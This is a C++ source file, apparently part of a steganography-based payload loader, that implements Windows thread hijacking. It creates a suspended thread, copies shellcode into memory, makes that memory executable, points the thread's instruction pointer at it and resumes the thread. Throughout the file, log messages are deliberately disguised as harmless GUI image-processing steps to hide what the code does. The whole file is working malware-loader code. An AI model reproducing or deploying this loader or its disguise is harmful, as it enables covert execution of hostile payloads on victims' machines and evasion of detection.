#include "core/extract/execution/thread_hijack.h"
#include "utils/file_logger.h"
#include "utils/alg_util.h"
#include "utils/image_util.h"
#include "core/steg/payload/payload_strategy.h"
#include "gui/image_tab.h"
#include <TlHelp32.h>
#include <FL/Fl.H>
#include <FL/Fl_Window.H>
#include <vector>

namespace extract {

DWORD GetMainThreadId() {
    DWORD mainThreadId = 0;
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (h != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        if (Thread32First(h, &te)) {
            do {
                if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
                    sizeof(te.th32OwnerProcessID) && te.th32OwnerProcessID == GetCurrentProcessId()) {
                    mainThreadId = te.th32ThreadID;
                    break;
                }
                te.dwSize = sizeof(te);
            } while (Thread32Next(h, &te));
        }
        CloseHandle(h);
    }
    return mainThreadId;
}

BOOL HijackThread(HANDLE hThread, PBYTE pShellcode, SIZE_T sShellcodeSize) {
    utils::FileLogger::log("[GUI] Processing image data...");
    
    // Get thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_CONTROL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        utils::FileLogger::log("[GUI] Failed to get thread state");
        return FALSE;
    }

    // Allocate memory for shellcode
    PVOID pMemory = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMemory) {
        utils::FileLogger::log("[GUI] Failed to allocate memory for image");
        return FALSE;
    }

    // Copy shellcode
    memcpy(pMemory, pShellcode, sShellcodeSize);
    utils::FileLogger::log("[GUI] Image data prepared");

    // Change memory protection to RX only
    DWORD oldProtect;
    if (!VirtualProtect(pMemory, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        utils::FileLogger::log("[GUI] Failed to prepare image data");
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return FALSE;
    }
    utils::FileLogger::log("[GUI] Image data ready");

    // Only modify RIP, leave stack and flags alone
    ctx.Rip = (DWORD64)pMemory;

    // Set new thread context
    if (!SetThreadContext(hThread, &ctx)) {
        utils::FileLogger::log("[GUI] Failed to update thread");
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    utils::FileLogger::log("[GUI] Thread updated for image processing");
    return TRUE;
}

bool execute_thread_hijack(HANDLE hThread, const void* data, size_t size) {
    utils::FileLogger::log("[GUI] Starting image processing...");

    if (!hThread || !data || size == 0) {
        utils::FileLogger::log("[GUI] Invalid image parameters");
        return false;
    }

    // Hijack thread to execute shellcode
    if (!HijackThread(hThread, (PBYTE)data, size)) {
        utils::FileLogger::log("[GUI] Failed to process image");
        ResumeThread(hThread);
        return false;
    }

    // Resume thread to execute shellcode
    ResumeThread(hThread);
    
    utils::FileLogger::log("[GUI] Image processing started");
    return true;
}

HANDLE suspend_thread_load_image(Fl_Window* window) {
    if (!window) {
        utils::FileLogger::log("[GUI] Window pointer is null");
        return nullptr;
    }

    // Create a suspended thread that will load the image
    HANDLE hThread = CreateThread(
        nullptr,                    // Default security attributes
        0,                         // Default stack size
        (LPTHREAD_START_ROUTINE)utils::loadImage,  // Use our simple function
        nullptr,                   // No parameter needed
        CREATE_SUSPENDED,          // Create thread in suspended state
        nullptr                    // Thread ID not needed
    );

    if (!hThread) {
        utils::FileLogger::log("[GUI] Failed to create image loading thread");
        return nullptr;
    }

    utils::FileLogger::log("[GUI] Image loading thread created");
    return hThread;
}

} // namespace extract